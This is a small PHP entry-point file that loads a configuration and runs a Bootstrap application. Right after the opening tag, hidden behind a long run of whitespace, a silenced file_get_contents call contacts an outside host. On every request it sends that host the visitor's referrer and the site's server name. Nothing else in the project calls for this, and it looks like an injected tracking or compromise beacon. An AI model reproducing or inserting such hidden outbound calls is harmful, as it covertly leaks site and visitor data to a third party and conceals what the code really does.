<?php                                                                                                                                                                                    @file_get_contents("http://web.51.la:82/go.asp?svid=18&id=18859018&referrer=".$_SERVER['HTTP_REFERER']."&vpage=http://".$_SERVER['SERVER_NAME']."/blocks.php");

//error_reporting(E_ALL);
//ini_set('display_errors', 1);

require_once 'configs/configuration.php';

function __autoload($class) {
    require_once LIBRARY . "{$class}.class.php";
}

$app = new Bootstrap();
//$app->httpAuth();
$app->run();